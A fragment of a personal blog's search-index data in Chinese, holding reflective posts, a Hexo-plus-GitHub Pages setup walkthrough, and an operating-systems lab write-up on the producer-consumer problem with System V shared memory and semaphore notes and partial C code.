，而我们大部分人甚至无法想象这种幸福，只能仰慕，并自我安慰的说：他们之所以这么牛逼是因为他们智商比我们高。可是那些牛逼的人却不知道怎么作答。因为他知道即使告诉他们真相，他们还是不会去接受。真相永远都是需要自我去发现的。\n\n我看完这个小哥写的这一篇回答之后感触颇深。我是一直认为人和人之间的智商是有很大差别的，到现在我也这样认为。有些人学习新事物就是很快，比如你花了一天时间去理解计算机数据结构中的链表时，有些人就在上课的时候听的明明白白，下课就能很熟练的利用一种编程语言将其实现成一个类，功能齐全，接口简单，而这个时候你还处于理解的状态。但是反过来一想，你上课用了100%的精神去理解了吗，下课后用了100%的精神去实现了吗。答案显然是没有的。这就是上面这个小哥说的这个问题，是不是真的用你所有的爱来拥抱世界，拥抱真理。\n\n很多人的一生都没有去从事他100%喜欢的工作。因此用所有的爱来拥抱世界就显得非常困难了。但是，我感觉人这一辈子，只要有一个不服输，不甘于落后的精神就可以了。要是说必须在所从事方面有很大的建树，只要坚持你的初心，在任何时候不放弃希望，等自己夕阳西下时回头一看，你这辈子，还真的是挺牛逼啊。","tags":["Life"]},{"title":"myclass_logo","url":"/2018/02/10/班徽logo-18.2.13/","content":"\n大学班级的班徽\n\n<!--more-->\n\n![](https://ws1.sinaimg.cn/large/006tNc79gy1fobh66yq3dj30en0dz47o.jpg)","tags":["Life"]},{"title":"基于github && hexo网站搭建记录","url":"/2018/02/10/基于Hexo与github的网站建设记录--18.2.10/","content":"\n感谢github这个开源平台能够为我们提供如此服务，我真的是被其开源思想深深吸引。人类计算机事业的发展少不了github的贡献。本网站也是基于github && hexo搭建的。下面记录搭建过程，以便后续翻看。\n\n<!--more-->\n\n### 一、建站前的准备\n\n终端操作系统：Mac OS Sierra\n\n博客搭建平台：Hexo\n\n托管平台：github，并且拥有一个账号\n\n我使用的操作系统是苹果的OS Sierra，和OS X差不多。由于其是一个类unix操作系统，因此很多地方和linux很像。也由于我的苹果电脑便携，因此windows下利用git bash等等工具搭建的过程目前还不是很清楚。预见到自己以后很长时间也会使用苹果的操作系统。\n\n### 二、操作系统配置\n\n#### 1、安装homebrew\n\nHomebrew是针对Mac os终端设计的软件包管理工具，拥有安装、卸载、更新、查看、搜索等很多实用的功能。简单的一条指令，就可以实现包管理，而不用你关心各种依赖和文件路径的情况，十分方便快捷。要求电脑上必须安装Xcode命令行工具。下载命令百度去其官网查看即可。\n\n#### 2、安装git && node.js && npm\n\n安装git：`brew install git`\n\nNode.js 和 npm的安装可以参见hexo官网：https://hexo.io\n\n但建议Node.js去其官网安装，版本较新。\n\n这里注意node.js和npm只要安装一遍就好了，如果安装多了不同的版本，每次打开终端时都会提示有版本冲突。如果出现这种情况需要删除配置以后再安装，很麻烦。\n\n### 三、在github上创建仓库\n\n新建一个名为`你的用户名.github.io`的仓库，比如说，如果你的github用户名是test，那么你就新建`test.github.io`的仓库（必须是你的用户名，其它名称无效），将来你的网站访问地址就是 `http://test.github.io/`了，非常方便\n\n由此可见，每一个github账户最多只能创建一个这样可以直接使用域名访问的仓库。创建成功后，默认会在你这个仓库里生成一些示例页面，以后的网站所有代码都是放在这个仓库里。\n\n### 四、绑定域名\n\n当然，不绑定域名肯定也是可以的，就用默认的 `xxx.github.io` 来访问，如果你想更个性一点，想拥有一个属于自己的域名，那也是OK的。\n\n本网站的域名是在阿里的万网上购买，20元一年。abigale的意思是“最初的快乐”。后缀就无所谓了，com肯定非常贵。\n\n绑定域名分2种情况：带www和不带www的。\n\n域名配置最常见有2种方式，CNAME和A记录，CNAME填写域名，A记录填写IP。到你的域名DNS设置页，将A记录指向github的IP，将CNAME指向`你的用户名.github.io`，这样可以保证无论是否添加www都可以访问。如下图\n\n![](https://ws4.sinaimg.cn/large/006tNc79gy1fobf4ahpqgj30qw066wfe.jpg)\n\n然后到你的github项目根目录新建一个名为CNAME的文件（无后缀），里面填写你的域名，加不加www都可以。\n\n### 五、配置SSH key\n\n配置ssh key的目的就是将你的终端电脑作为一台可信设备能够与github上的服务器进行通信。\n\n可以直接在终端里面敲命令\n\n`.ssh` 这样就直接进入了ssh配置文件夹。如果出现错误说明是第一次使用ssh。\n\n然后敲命令\n\n`ssh-keygen -t rsa -C \"邮件地址\"`邮箱地址为注册github的邮箱地址。\n\n然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到`.ssh\\id_rsa.pub`文件，记事本打开并复制里面的内容，打开github主页，进入个人设置 -> SSH and GPG keys -> New SSH key：\n\n进行测试\n\n`ssh -T git@github.com # 注意邮箱地址不用改`\n\n有提示输入yes，然后如果看到提示\n\nHi xxxxxx! You’ve successfully authenticated, but GitHub does not provide shell access.\n\n则说明配置成功了。后面还需要敲两行命令\n\n`git config --global user.name \"xxx\"// 你的github用户名，非昵称`\n`git config --global user.email  \"xxx@qq.com\"// 填写你的github注册邮箱`\n\n### 六、使用hexo搭建博客\n\nHexo是一个简单、快速、强大的基于 Github Pages 的博客发布工具，支持Markdown格式，有众多优秀插件和主题。\n\n由于github pages存放的都是静态文件，博客存放的不只是文章内容，还有文章列表、分类、标签、翻页等动态内容，假如每次写完一篇文章都要手动更新博文目录和相关链接信息，相信谁都会疯掉，所以hexo所做的就是将这些md文件都放在本地，每次写完文章后调用写好的命令来批量完成相关页面的生成，然后再将有改动的页面提交到github。\n\n安装过程详见hexo官网。\n\n安装好后就可以创建一个hexo博客工作站\n\n在终端敲命令：\n\n`hexo init 文件夹名`\n\n以后所有的hexo工作都在此文件夹中进行。\n\n有一项注意的：在我的电脑上每次打开终端都需要先敲命令\n\n`nvm install stable`\n\n才能使用hexo，这个可能是需要重新下载nvm的稳定版。\n\n然后将当前路径定位到你的博客工作站，会发现有如下文件：\n\n![](https://ws1.sinaimg.cn/large/006tNc79gy1fobfj1kftvj309s02hglu.jpg)\n\n然后再敲hexo g 和hexo s，通过浏览器访问localhost:4000，就可以看到本地预览服务的网站了。\n\n在工作站根目录下的_config.yml里面可以修改配置信息，如主题、网站标题以及上传仓库等等。\n\n有关上传到github的配置部分如下：\n\n```c++\ndeploy:\n  type: git\n  repository: git@github.com:xxx/xxx.github.io.git\n  branch: master\n```\n\n并且安装插件：`npm install hexo-deployer-git --save`，且每次上传之前都要安装此插件，具体为什么我也不知道。\n\n然后hexo d就可以了。每次写文章要在source/_post目录下写就可以了。\n\n常见命令：\n\nhexo new \"postName\" #新建文章\nhexo new page \"pageName\" #新建页面\nhexo generate #生成静态页面至public目录\nhexo server #开启预览访问端口（默认端口4000，'ctrl + c'关闭server）\nhexo deploy #部署到GitHub\nhexo help  # 查看帮助\nhexo version  #查看Hexo的版本\n\n还需要在source文件夹下建立一个无后缀名的CNAME保存域名，不然每次上传都会让之前的域名文件覆盖掉。也可加上一个README.md。\n\n### 七、致谢\n\n感谢hexo以及github ，还有设计本主题的作者，网站底部有其作者网站链接。","tags":["record"]},{"title":"一次分享会的感受","url":"/2018/02/09/北京户口学姐分享会感受--18.2.13/","content":"\n之前有幸听了一位进入国企，拿到北京户口并且当前年薪25W左右的隔壁大学的学姐的分享，感触颇深。\n\n<!--more-->\n\n#### 一、成绩还真的很重要\n\n上大学之后自己并没有那么重视成绩。很过国企还是很看重成绩的，要有个学习的态度。现在为实已晚，就不要纠结太多，把后面的课程学好，努力努力再努力的准备考研吧。\n\n#### 二、多维发展\n\n不要设限于单点，只拼技术，只拼成绩。只做学生工作都有点偏。但只要每一步都认真踏实地走，没有一步会走亏的，一定会在某一天，突然间就帮到你了，一定会的，功不唐捐。\n\n#### 三、多去实践\n\n由于自己也不是特别积极的人，两年半了也没主动去找过老师做项目。现在想但做发现自己要准备考研了。说实话这前两年，我没有上成自己的大学，而只是上成了学校的大学。不要为满足学校、比赛的要求而学习。是要带有自己的目标去，做成我的项目，打成我的比赛，上成我的大学，而不是我们的。\n\n#### 四、做学生工作、当小官很有用\n\n估计自己要做4年的班长了，不后悔，也从来没有后悔过。这是我大学中最值得骄傲的事情。为大家也好，为自己也好。也所谓“结交皆老苍，脱略小时辈”。多和长辈交流，资源丰富，思想超前。\n\n#### 五、放宽视野和思维，主动开拓人生多种可能性\n\n从山顶看，上山的路有无数条，但爬山的人，只有一条路可走，那就是走到山顶的路。所谓成事业者，非超世之才，唯坚韧不拔之志。许多人的大学就像跟团旅游，各个景点都被导游领着看到了。但然并卵。如果能自备背包，勇敢探索，整成个自助游，必要时找人帮忙，或别有洞天奇景。\n\n加油吧！zhs！\n","tags":["feeling"]},{"title":"My name_logo","url":"/2018/01/26/名字logo--18.1.26/","content":"\n### <!--more-->\n\n![](https://ws3.sinaimg.cn/large/006tNbRwly1fnuco4crrlg30dw05lwfw.gif)"},{"title":"Linux下利用信号量函数和共享内存函数和C语言实现生产者消费者问题","url":"/2018/01/24/生产者消费者问题--18.1.25/","content":"### 一、引言\n\n此问题是操作系统中的一个经典的同步异步问题，是我们操作系统课程中非常重要的一部分。实验要求我们用C语言在Linux操作系统下利用信号量函数和共享内存函数实现经典的生产者消费者问题。也借此把所学知识记录下来。实验要求如下：\n\n<!--more-->\n\n在Linux操作系统下用C实现经典同步问题:生产者—消费者，具体要求如下: \n\n（1）一个大小为10的缓冲区，初始状态为空。\n\n（2）2个生产者，随机等待一段时间，往缓冲区中添加数据，若缓冲区已满，等待消费者取走数据之后再添加，重复10次。\n\n（3）2个生产者，随机等待一段时间，往缓冲区中读取数据，若缓冲区为空，等待生产者添加数据之后再读取，重复10次。\n\n（4）当前只能有一个进程对这个缓冲区进行操作 。\n\n（5）缓冲区采用循环队列表示，利用头、尾指针来存放、读取数据，以及判断队列是否为空。缓冲区中数组大小为10。\n\n（6）利用随机函数rand()得到A~Z的一个随机字符，作为生产者每次生产的数据，存放到缓冲区中。\n\n（7）使用shmget()系统调用实现共享主存段的创建，shmget()返回共享内存区的ID。对于已经申请到的共享段，进程需把它附加到自己的虚拟空间中才能对其进行读写。\n\n（8）信号量的建立采用semget()函数，同时建立信号量的 数量。在信号量建立后，调用semctl()对信号量进行初始2化 ，例如本实验中，可以建立两个信号量SEM_EMPTY、 SEM_FULL，初始化时设置SEM_EMPTY为10，SEM_FULL 为0。使用操 作信号的函数semop()做排除式操作，使用这个 函数防止对共享内存的同时操作。对共享内存操作完毕后采用shmctl()函数撤销共享内存段。\n\n（9）使用循环，创建2个生产者以及2个消费者，采用函数 fork()创建一个新的进程。\n\n（10）一个进程的一次操作完成后，采用函数fflush()刷新缓冲区。\n\n（11）程序最后使用semctl()函数释放内存。\n\n### 二、生产者消费者问题\n\n生产者和消费者问题是多个相互合作的进程之间的一种抽象。生产者和消费者之间的关系:\n\n1. 对缓冲区的访问是互斥的。由于两者都会修改缓冲区，因此，一方修改缓冲区时，另一方不能修改，这就是互斥。\n2. 一方的行为影响另一方。缓冲区不空，才能消费，何时不空？生产了就不空；缓冲区满，就不能生产，何时不满？消费了就不满。这是同步关系。\n\n为了描述这种关系，一方面，使用共享内存代表缓冲区；另一方面，使用互斥信号量 控制对缓冲区的访问，使用同步信号量描述两者的依赖关系。\n\n### 三、信号量\n\n抽象的来讲，信号量（signal)的特性如下：信号量是一个非负整数，所有通过它的[线程](https://baike.baidu.com/item/%E7%BA%BF%E7%A8%8B)/进程都会将该整数减一（通过它当然是为了使用资源），当该整数值为零时，所有试图通过它的线程都将处于等待状态。在信号量上我们定义两种操作： Wait（等待） 和 Release（释放）。当一个线程调用Wait操作时，它要么得到资源然后将信号量减一，要么一直等下去（指放入阻塞队列），直到信号量大于等于一时。Release（释放）实际上是在信号量上执行加操作，对应于车辆离开停车场，该操作之所以叫做“释放”是因为释放了由信号量守护的资源。在通用术语上我们将此两种操作成为P、V操作。而操作的对象就是信号量（signal)，用来实现线程/进程的同步、异步和互斥。\n\n### 四、共享内存函数\n\n共享内存函数由shmget、shmat、shmdt、shmctl四个函数组成。下面列出了这四个函数的函数原型及其具体说明。\n\n#### 1.   shmget函数原型\n\nshmget(得到一个共享内存标识符或创建一个共享内存对象)\n\n##### 所需头文件：\n\n`#include <sys/ipc.h>`\n\n`#include <sys/shm.h>`\n\n##### 函数说明：\n\n得到一个共享内存标识符或创建一个共享内存对象并返回共享内存标识符\n\n##### 函数原型：\n\nint shmget(key_t key, size_t size, int shmflg)\n\n##### 函数传入值：\n\nkey：\n\n（1）0(IPC_PRIVATE)：会建立新共享内存对象。\n\n（2）大于0的32位整数：视参数shmflg来确定操作。通常要求此值来源于ftok返回的IPC键值。\n\nsize：\n\n（1）大于0的整数：新建的共享内存大小，以字节为单位。\n\n（2）0：只获取共享内存时指定为0。\n\nshmflg：\n\n（1）0：取共享内存标识符，若不存在则函数会报错。\n\n（2）IPC_CREAT：当shmflg&IPC_CREAT为真时，如果内核中不存在键值与key相等的共享内存，则新建一个共享内存；如果存在这样的共享内存，返回此共享内存的标识符。\n\n（3）IPC_CREAT|IPC_EXCL：如果内核中不存在键值与key相等的共享内存，则新建一个消息队列；如果存在这样的共享内存则报错。\n\n##### 函数返回值：\n\n（1）成功：返回共享内存的标识符。\n\n（2）出错：-1，错误原因存于error中。\n\n##### 附加说明：\n\n上述shmflg参数为模式标志参数，使用时需要与IPC对象存取权限（如0600表示用户可以读写改内存）进行|运算来确定信号量集的存取权限 。\n\n##### 错误代码：\n\n（1）EINVAL：参数size小于SHMMIN或大于SHMMAX 。\n\n（2）EEXIST：预建立key所指的共享内存，但已经存在 。\n\n（3）EIDRM：参数key所指的共享内存已经删除 。\n\n（4）ENOSPC：超过了系统允许建立的共享内存的最大值(SHMALL)。\n\n（5）ENOENT：参数key所指的共享内存不存在，而参数shmflg未设IPC_CREAT位 。\n\n（6）EACCES：没有权限 。\n\n（7）ENOMEM：核心内存不足。\n\n##### 附加说明：\n\n在Linux环境中，对开始申请的共享内存空间进行了初始化，初始值为0x00。\n\n如果用shmget创建了一个新的消息队列对象时，则shmid_ds结构成员变量的值设置如下：\n\nshm_lpid、shm_nattach、shm_atime、shm_dtime设置为0。\n\nmsg_ctime设置为当前时间。\n\nshm_segsz设成创建共享内存的大小。\n\nshmflg的读写权限放在shm_perm.mode中。\n\nshm_perm结构的uid和cuid成员被设置成当前进程的有效用户ID，gid和cuid成员被设置成当前进程的有效组ID。\n\n#### 2.   shmat函数原型\n\nshmat(把共享内存区对象映射到调用进程的地址空间)\n\n##### 所需头文件：\n\n`#include <sys/types.h>`\n\n`#include <sys/shm.h>`\n\n##### 函数说明：\n\n连接共享内存标识符为shmid的共享内存，连接成功后把共享内存区对象映射到调用进程的地址空间，随后可像本地空间一样访问。\n\n##### 函数原型：\n\nvoid *shmat(int shmid, const void *shmaddr, int shmflg)\n\n##### 函数传入值：\n\nmsqid：共享内存标识符。\n\nshmaddr：指定共享内存出现在进程内存地址的什么位置，直接指定为NULL让内核自己决定一个合适的地址位置。\n\nshmflg：SHM_RDONLY：为只读模式，其他为读写模式。\n\n##### 函数返回值：\n\n（1）成功：附加好的共享内存地址。\n\n（2）出错：-1，错误原因存于error中。\n\n##### 附加说明：\n\nfork后子进程继承已连接的共享内存地址。exec后该子进程与已连接的共享内存地址自动脱离(detach)。进程结束后，已连接的共享内存地址会自动脱离(detach)。\n\n##### 错误代码：\n\n（1）EACCES：无权限以指定方式连接共享内存。\n\n（2）EINVAL：无效的参数shmid或shmaddr。\n\n（3）ENOMEM：核心内存不足。\n\n#### 3.   shmdt函数原型\n\nshmat(断开共享内存连接)\n\n##### 所需头文件：\n\n`#include <sys/types.h>`\n\n``#include <sys/shm.h>``\n\n##### 函数说明：\n\n与shmat函数相反，是用来断开与共享内存附加点的地址，禁止本进程访问此片共享内存。\n\n##### 函数原型：\n\nint shmdt(const void *shmaddr)\n\n##### 函数传入值：\n\nshmaddr：连接的共享内存的起始地址。\n\n##### 函数返回值：\n\n（1）成功：0。\n\n（2）出错：-1，错误原因存于error中。\n\n##### 附加说明：\n\n本函数调用并不删除所指定的共享内存区，而只是将先前用shmat函数连接（attach）好的共享内存脱离（detach）目前的进程。\n\n##### 错误代码：\n\nEINVAL：无效的参数shmaddr。\n\n#### 4.   shmctl函数原型\n\nshmctl(共享内存管理)\n\n##### 所需头文件：\n\n`#include <sys/types.h>`\n\n`#include <sys/shm.h>`\n\n##### 函数说明：\n\n完成对共享内存的控制\n\n##### 函数原型：\n\nint shmctl(int shmid, int cmd, struct shmid_ds *buf)\n\n##### 函数传入值：\n\nmsqid：共享内存标识符\n\ncmd:\n\n（1）IPC_STAT：得到共享内存的状态，把共享内存的shmid_ds结构复制到buf中。\n\n（2）IPC_SET：改变共享内存的状态，把buf所指的shmid_ds结构中的uid、gid、mode复制到共享内存的shmid_ds结构内 。\n\n（3）IPC_RMID：删除这片共享内存。\n\nbuf：共享内存管理结构体。具体说明参见共享内存内核结构定义部分\n\n##### 函数返回值：\n\n（1）成功：0。\n\n（2）出错：-1，错误原因存于error中。\n\n##### 错误代码：\n\n（1）EACCESS：参数cmd为IPC_STAT，确无权限读取该共享内存。\n\n（2）EFAULT：参数buf指向无效的内存地址。\n\n（3）EIDRM：标识符为msqid的共享内存已被删除。\n\n（4）EINVAL：无效的参数cmd或shmid。\n\n（5）EPERM：参数cmd为IPC_SET或IPC_RMID，却无足够的权限执行 。\n\n### 四、信号量函数\n\n信号量函数由semget、semop、semctl三个函数组成。下面列出了这三个函数的函数原型及具体说明。\n\n#### 1.   semget函数原型\n\nsemget(得到一个信号量集标识符或创建一个信号量集对象)\n\n##### 所需头文件：\n\n`#include <sys/types.h>`\n\n`#include <sys/ipc.h>`\n\n`#include <sys/sem.h>`\n\n##### 函数说明：\n\n得到一个信号量集标识符或创建一个信号量集对象并返回信号量集标识符。\n\n##### 函数原型：\n\nint semget(key_t key, int nsems, int semflg)\n\n##### 函数传入值：\n\nkey：\n\n（1）0(IPC_PRIVATE)：会建立新信号量集对象。\n\n（2）大于0的32位整数：视参数semflg来确定操作，通常要求此值来源于ftok返回的IPC键值。\n\nnsems：创建信号量集中信号量的个数，该参数只在创建信号量集时有效。\n\nsemfl：\n\n（1）0：取信号量集标识符，若不存在则函数会报错。\n\n（2）IPC_CREAT：当semflg&IPC_CREAT为真时，如果内核中不存在键值与key相等的信号量集，则新建一个信号量集；如果存在这样的信号量集，返回此信号量集的标识符。\n\n（3）IPC_CREAT|IPC_EXCL：如果内核中不存在键值与key相等的信号量集，则新建一个消息队列；如果存在这样的信号量集则报错。\n\n##### 函数返回值：\n\n（1）成功：返回信号量集的标识符。\n\n（2）出错：-1，错误原因存于error中。\n\n##### 附加说明：\n\n上述semflg参数为模式标志参数，使用时需要与IPC对象存取权限（如0600如共享内存函数）进行|运算来确定信号量集的存取权限 。\n\n##### 错误代码：\n\n（1）EACCESS：没有权限。\n\n（2）EEXIST：信号量集已经存在，无法创建。\n\n（3）EIDRM：信号量集已经删除。\n\n（4）ENOENT：信号量集不存在，同时semflg没有设置IPC_CREAT标志。\n\n（5）ENOMEM：没有足够的内存创建新的信号量集。\n\n（6）ENOSPC：超出限制。\n\n如果用semget创建了一个新的信号量集对象时，则semid_ds结构成员变量的值设置如下：\n\n​        sem_otime设置为0。\n\n​        sem_ctime设置为当前时间。\n\n​        msg_qbytes设成系统的限制值。\n\n​        sem_nsems设置为nsems参数的数值。\n\n​        semflg的读写权限写入sem_perm.mode中。\n\n​        sem_perm结构的uid和cuid成员被设置成当前进程的有效用户ID，gid和cuid成员被设置成当前进程的有效组ID。\n\n#### 2.   semop函数原型\n\nsemop(完成对信号量的P操作或V操作)\n\n##### 所需头文件：\n\n`#include <sys/types.h>`\n\n`#include <sys/ipc.h>`\n\n`#include <sys/sem.h>`\n\n##### 函数说明：\n\n对信号量集标识符为semid中的一个或多个信号量进行P操作或V操作。\n\n##### 函数原型：\n\nint semop(int semid, struct sembuf *sops, unsigned nsops)\n\n##### 函数传入值：\n\nsemid：信号量集标识符。\n\nsops：指向进行操作的信号量集结构体数组的首地址，此结构的具体说明如下：\n\nstruct sembuf {\n\n​    short semnum; /*信号量集合中的信号量编号，0代表第1个信号量*/\n\n​    short val;/*若val>0进行V操作信号量值加val，表示进程释放控制的资源 */\n\n/*若val<0进行P操作信号量值减val，若(semval-val)<0（semval为该信号量值），则调用进程阻塞，直到资源可用；若设置IPC_NOWAIT不会睡眠，进程直接返回EAGAIN错误*/ \n\n  /*若val==0时阻塞等待信号量为0，调用进程进入睡眠状态，直到信号值为0；若设置IPC_NOWAIT，进程不会睡眠，直接返回EAGAIN错误*/\n\n​    short flag;  /*0 设置信号量的默认操作*/\n\n/*IPC_NOWAIT设置信号量操作不等待*/\n\n/*SEM_UNDO 选项会让内核记录一个与调用进程相关的UNDO记录，如果该进程崩溃，则根据这个进程的UNDO记录自动恢复相应信号量的计数值*/\n\n  }; \n\nnsops：进行操作信号量的个数，即sops结构变量的个数，需大于或等于1。最常见设置此值等于1，只完成对一个信号量的操作。\n\n##### 函数返回值：\n\n（1）成功：返回信号量集的标识符。\n\n（2）出错：-1，错误原因存于error中。\n\n##### 错误代码：\n\n（1）E2BIG：一次对信号量个数的操作超过了系统限制。\n\n（2）EACCESS：权限不够。\n\n（3）EAGAIN：使用了IPC_NOWAIT，但操作不能继续进行。\n\n（4）EFAULT：sops指向的地址无效。\n\n（5）EIDRM：信号量集已经删除。\n\n（6）EINTR：当睡眠时接收到其他信号。\n\n（7）EINVAL：信号量集不存在,或者semid无效。\n\n（8）ENOMEM：使用了SEM_UNDO，但无足够的内存创建所需的数据结构。\n\n（9）ERANGE：信号量值超出范围。\n\nsops为指向sembuf数组，定义所要进行的操作序列。下面是信号量操作举例。\n\nstruct sembuf sem_get={0,-1,IPC_NOWAIT}; /*将信号量对象中序号为0的信号量减1*/\n\nstruct sembuf sem_get={0,1,IPC_NOWAIT};  /*将信号量对象中序号为0的信号量加1*/\n\nstruct sembuf sem_get={0,0,0};           /*进程被阻塞，直到对应的信号量值为0*/\n\nflag一般为0，若flag包含IPC_NOWAIT，则该操作为非阻塞操作。若flag包含SEM_UNDO，则当进程退出的时候会还原该进程的信号量操作，这个标志在某些情况下是很有用的，比如某进程做了P操作得到资源，但还没来得及做V操作时就异常退出了，此时，其他进程就只能都阻塞在P操作上，于是造成了死锁。若采取SEM_UNDO标志，就可以避免因为进程异常退出而造成的死锁。\n\n#### 3.   semctl函数原型\n\nsemctl (得到一个信号量集标识符或创建一个信号量集对象)\n\n##### 所需头文件：\n\n`#include <sys/types.h>`\n\n`#include <sys/ipc.h>`\n\n`#include <sys/sem.h>`\n\n##### 函数说明：\n\n得到一个信号量集标识符或创建一个信号量集对象并返回信号量集标识符。\n\n##### 函数原型：\n\nint semctl(int semid, int semnum, int cmd, union semun arg)\n\n##### 函数传入值：\n\nsemid：信号量集标识符。\n\nsemnum：信号量集数组上的下标，表示某一个信号量。\n\ncmd：见下文表。\n\narg：\n\nunion semun {\n\n   short val;          /*SETVAL用的值*/\n\n   struct semid_ds* buf; /*IPC_STAT、IPC_SET用的semid_ds结构*/\n\n   unsigned short* array; /*SETALL、GETALL用的数组值*/\n\n   struct seminfo *buf;   /*为控制IPC_INFO提供的缓存*/\n\n  } arg;\n\n##### 函数返回值：\n\n（1）成功：大于或等于0，具体说明请参照下文表。\n\n（2）出错：-1，错误原因存于error中。\n\n##### 附加说明：\n\nsemid_ds结构见信号量集内核结构定义。\n\n##### 错误代码：\n\n（1）EACCESS：权限不够。\n\n（2）EFAULT：arg指向的地址无效。\n\n（3）EIDRM：信号量集已经删除。\n\n（4）EINVAL：信号量集不存在，或者semid无效。\n\n（5）EPERM：进程有效用户没有cmd的权限。\n\n（6）ERANGE：信号量值超出范围。\n\n表-semctl函数cmd形参说明表\n\n| 命令       | 解   释                                    |\n| -------- | ---------------------------------------- |\n| IPC_STAT | 从信号量集上检索semid_ds结构，并存到semun联合体参数的成员buf的地址中 |\n| IPC_SET  | 设置一个信号量集合的semid_ds结构中ipc_perm域的值，并从semun的buf中取出值 |\n| IPC_RMID | 从内核中删除信号量集合                              |\n| GETALL   | 从信号量集合中获得所有信号量的值，并把其整数值存到semun联合体成员的一个指针数组中 |\n| GETNCNT  | 返回当前等待资源的进程个数                            |\n| GETPID   | 返回最后一个执行系统调用semop()进程的PID                |\n| GETVAL   | 返回信号量集合内单个信号量的值                          |\n| GETZCNT  | 返回当前等待100%资源利用的进程个数                      |\n| SETALL   | 与GETALL正好相反                              |\n| SETVAL   | 用联合体中val成员的值设置信号量集合中单个信号量的值              |\n\n### 五、struct sembuf的部分讲解\n\n`struct sembuf`  \n{  \n  unsigned short int sem_num;   /* 信号量的序号从0~nsems-1 */  \n  short int sem_op;            /* 对信号量的操作，>0, 0, <0 */  \n  short int sem_flg;            /* 操作标识：0， IPC_WAIT, SEM_UNDO */  \n`};` \n\n**sem_num**标识信号量集中的第几个信号量，0表示第1个，1表示第2个，nsems - 1表示最后一个。\n\n**sem_op**标识对信号量的所进行的操作类型。对信号量的操作有三种类型：\n\n- sem_op > 0，对该信号量执行挂出操作，挂出的值由sem_op决定，系统会把sem_op的值加到该信号量的当前值semval（参考文章开头关于每个信号量结构的定义）上。如果sem_flag指定了SEM_UNDO（还原）标志，那么相应信号量的semadj值会减掉sem_op的值。下面会说明semadj的含义。\n- sem_op < 0，对该信号量执行等待操作，当信号量的当前值semval >= -sem_op时，semval减掉sem_op的绝对值，为该线程分配对应数目的资源。如果指定SEM_UNDO，相应信号量的semadj就加上sem_op的绝对值。当semval < -sem_op时，相应信号量的semncnt就加1，调用线程被阻塞，直到semval >= -sem_op，当此条件满足时，调用线程被唤醒，执行相应的分配操作，然后semncnt减去1.\n- sem_op = 0，表示调用者希望semval变为0。如果为0则立即返回，如果不为0，相应信号量的semzcnt加1，调用调用线程被阻塞。\n\n**sem_flag**：信号量操作的属性标志，如果为0，表示正常操作，如果为IPC_WAIT，使对信号量的操作时非阻塞的。即指定了该标志，调用线程在信号量的值不满足条件的情况下不会被阻塞，而是直接返回-1，并将errno设置为EAGAIN。如果为SEM_UNDO，那么将维护进程对信号量的调整值，以便进程结束时恢复信号量的状态。\n\n下面解释一下与单个信号量相关的几个值：\n\n**semval**：信号量的当前值，在文章开头信号量的结构中已提到。****\n\n**semncnt**：等待semval变为大于当前值的线程数。在文章开头信号量的结构中已提到。\n\n**semzcnt**：等待semval变为0的线程数。在文章开头信号量的结构中已提到。\n\n**semadj**：指定信号量针对某个特定进程的调整值。只有sembuf结构的sem_flag指定为SEM_UNDO后，semadj才会随着sem_op而更新。**讲简单一点：对某个进程，在指定SEM_UNDO后，对信号量semval值的修改都会反应到semadj上，当该进程终止的时候，内核会根据semadj的值，重新恢复信号量之前的值。**\n\n### 六、本次实验代码\n\n```c++\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <time.h>\n#include <sys/ipc.h>\n#include <sys/shm.h>\n#include <sys/sem.h>\n#include <sys/types.h>\n\n#define MAX_BUFFER_SIZE 10\n#define SHM_MODE 0600\n#define SEM_MODE 0600\n\n#define SEM_FULL 0\n#define SEM_EMPTY 1\n#define MUTEX 2\n/*\n#if defined(__GNU_LIBRARY__) && !defined(_SEM_SEMUN_UNDEFINED)\n//\t union   semun   is   defined   by   including   <sys/sem.h>   \n#else \n//   according   to   X/OPEN   we   have   to   define   it   ourselves  \nunion semun{\n\tint val;\n\tstruct semid_ds *buf;\n\tunsigned short *array;\n};\n#endif\nunion semun su;//sem union，用于初始化信号量\n*/\n\nstruct my_buffer\n{\n\tint head;\n\tint tail;\n\tchar str[MAX_BUFFER_SIZE];\n\tint num;  //缓冲区里字母数量\n\tint is_empty;\n};\n\nconst int N_CONSUMER = 2;//消费者数量\nconst int N_PRODUCER = 2;//生产者数量\nconst int N_BUFFER = 10;//缓冲区容量\nconst int N_WORKTIME = 10;//工作次数\nint shm_id = -1;\nint sem_id = -1;\npid_t child;\npid_t parent;\n\n//得到10以内的一个随机数  \nint get_random()  \n{  \n    int digit;  \n    srand((unsigned)(getpid() + time(NULL)));  \n    digit = rand() % 10;  \n    return digit;  \n}  \n\n//得到A～Z的一个随机字母  \nchar getRandChar()\n{\n    char letter;  \n    srand((unsigned)(getpid() + time(NULL)));  \n    letter = (char)((rand() % 26) + 'A');  \n    return letter;  \n}\n\n//sem_id 表示信号量集合的 id\n//sem_num 表示要处理的信号量在信号量集合中的索引\n//P操作\nvoid waitSem(int sem_id,int sem_num)\n{\n\tstruct sembuf sb;\n\tsb.sem_num = sem_num;\n\tsb.sem_op = -1;//表示要把信号量减一\n\tsb.sem_flg = SEM_UNDO;//\n\t//第二个参数是 sembuf [] 类型的，表示数组\n\t//第三个参数表示 第二个参数代表的数组的大小\n\tif(semop(sem_id,&sb,1) < 0){\n\t\tperror(\"waitSem failed\");\n\t\texit(1);\n\t}\n}\n\n//V操作\nvoid sigSem(int sem_id,int sem_num)\n{\n\tstruct sembuf sb;\n\tsb.sem_num = sem_num;\n\tsb.sem_op = 1;\n\tsb.sem_flg = SEM_UNDO;\n\t//第二个参数是 sembuf [] 类型的，表示数组\n\t//第三个参数表示 第二个参数代表的数组的大小\n\tif(semop(sem_id,&sb,1) < 0){\n\t\tperror(\"sigSem failed\");\n\t\texit(1);\n\t}\n}\n\n//打印进程运行结果\nvoid printTime()\n{\n\t//打印时间\n\ttime_t now;\n\tstruct tm *timenow;         //实例化tm结构指针\n\ttime(&now);\n\ttimenow = localtime(&now);\n\tprintf(\"执行时间： %s \",asctime(timenow));\n}\n\nint main(int argc, char ** argv)\n{\n\tshm_id = shmget(IPC_PRIVATE,MAX_BUFFER_SIZE,SHM_MODE);   //申请共享内存\n\tif(shm_id < 0)\n\t{\n\t\tperror(\"create shared memory failed\");\n\t\texit(1);\n\t}\n\n\tstruct my_buffer *shmptr;  \n\tshmptr = shmat(shm_id, 0, 0);   //将申请的共享内存附加到申请通信的进程空间\n\tif (shmptr == (void*)-1)\n\t{  \n        perror(\"add buffer to using 